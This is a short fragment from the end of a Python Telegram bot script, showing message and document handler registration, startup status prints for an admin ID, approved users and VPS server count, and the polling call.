    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print(f"{G}✅ Bot is running!")
    print(f"{Y}👑 Admin ID: {ADMIN_ID}")
    print(f"{C}📊 Approved Users: {len(APPROVED_USERS)}")
    print(f"{C}📊 VPS Count: {len(vps_servers)}")
    
    app.run_polling()

if __name__ == "__main__":
    main()